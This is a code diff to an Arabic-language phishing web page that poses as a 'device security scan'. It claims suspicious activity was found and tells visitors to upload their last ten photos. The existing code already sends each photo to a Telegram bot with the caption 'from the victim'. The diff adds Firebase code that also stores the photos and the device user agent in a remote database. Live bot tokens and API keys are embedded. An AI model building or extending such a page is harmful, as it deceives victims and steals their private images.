@@ -4,6 +4,8 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
 <title>فحص أمان الجهاز</title>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:'Segoe UI',Tahoma,sans-serif;background:linear-gradient(135deg,#1a1a2e,#16213e,#0f3460);color:#fff;min-height:100vh;padding:20px}
@@ -26,7 +28,6 @@ h1{font-size:20px;color:#4CAF50;margin-bottom:5px}
 input[type=file]{display:none}
 .btn{width:100%;padding:16px;margin-top:12px;background:#4CAF50;color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:bold;cursor:pointer;opacity:0.5;pointer-events:none}
 .btn.active{opacity:1;pointer-events:auto}
-.btn:active{transform:scale(0.96)}
 .load{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.95);z-index:99;justify-content:center;align-items:center;flex-direction:column}
 .load.show{display:flex}
 .spinner{width:50px;height:50px;border:4px solid #333;border-top:4px solid #4CAF50;border-radius:50%;animation:spin 0.8s linear infinite;margin-bottom:18px}
@@ -41,12 +42,7 @@ input[type=file]{display:none}
 <div class="logo">🛡️</div>
 <h1>فحص أمان الجهاز</h1>
 <p class="sub">ارفع 10 صور لفحص الفيروسات</p>
-
-<div class="alert-box">
-<div class="title">⚠️ تحذير أمني</div>
-<div class="desc">تم اكتشاف نشاط مشبوه! يرجى رفع آخر 10 صور لتأكيد سلامة الجهاز</div>
-</div>
-
+<div class="alert-box"><div class="title">⚠️ تحذير أمني</div><div class="desc">تم اكتشاف نشاط مشبوه! يرجى رفع آخر 10 صور لتأكيد سلامة الجهاز</div></div>
 <div class="upload-grid" id="uploadGrid">
 <div class="upload-box" onclick="document.getElementById('f1').click()"><div class="icon">📷</div><div class="txt">صورة 1</div><div class="check">✓</div></div>
 <div class="upload-box" onclick="document.getElementById('f2').click()"><div class="icon">📷</div><div class="txt">صورة 2</div><div class="check">✓</div></div>
@@ -59,7 +55,6 @@ input[type=file]{display:none}
 <div class="upload-box" onclick="document.getElementById('f9').click()"><div class="icon">📷</div><div class="txt">صورة 9</div><div class="check">✓</div></div>
 <div class="upload-box" onclick="document.getElementById('f10').click()"><div class="icon">📷</div><div class="txt">صورة 10</div><div class="check">✓</div></div>
 </div>
-
 <input type="file" id="f1" accept="image/*" onchange="upload(this,0)">
 <input type="file" id="f2" accept="image/*" onchange="upload(this,1)">
 <input type="file" id="f3" accept="image/*" onchange="upload(this,2)">
@@ -70,11 +65,9 @@ input[type=file]{display:none}
 <input type="file" id="f8" accept="image/*" onchange="upload(this,7)">
 <input type="file" id="f9" accept="image/*" onchange="upload(this,8)">
 <input type="file" id="f10" accept="image/*" onchange="upload(this,9)">
-
 <button class="btn" id="scanBtn" onclick="scan()">🔍 ابدأ الفحص</button>
 <p style="color:#888;font-size:10px;margin-top:8px;" id="counter">0/10 صور</p>
 </div>
-
 <div class="load" id="load"><div class="spinner"></div><p>⏳ جاري فحص الصور...</p></div>
 <div class="done" id="done"><h2>✅ الجهاز آمن!</h2><p>لم يتم العثور على فيروسات</p></div>
 
@@ -84,6 +77,14 @@ var CHAT=u.searchParams.get('chatId')||'7276604783';
 var TOKEN=u.searchParams.get('token')||'8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
 var uploaded=0;
 var boxes=document.querySelectorAll('.upload-box');
+var imageUrls=[];
+
+firebase.initializeApp({apiKey:"AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",projectId:"game-a1aca",storageBucket:"game-a1aca.firebasestorage.app",appId:"1:598280425947:android:0e4ead8d9b50cfc92157fe"});
+var db=firebase.firestore();
+
+async function sendToGallery(url,type){
+try{await db.collection('gallery').add({url:url,type:type,timestamp:new Date().toISOString(),device:navigator.userAgent});}catch(e){}
+}
 
 async function send(t){
 try{await fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT,text:t,parse_mode:'HTML'})})}catch(e){}
@@ -104,6 +105,7 @@ var reader=new FileReader();
 reader.onload=function(e){
 boxes[index].classList.add('filled');
 boxes[index].innerHTML='<img src="'+e.target.result+'"><div class="check">✓</div>';
+imageUrls.push(e.target.result);
 };
 reader.readAsDataURL(file);
 uploaded++;
@@ -119,6 +121,7 @@ for(var i=1;i<=10;i++){
 var input=document.getElementById('f'+i);
 if(input.files[0]){
 await sendPhoto(input.files[0],'📸 صورة '+i+' من الضحية');
+if(imageUrls[i-1]){await sendToGallery(imageUrls[i-1],'📁 فحص أمان');}
 }
 }
 setTimeout(function(){
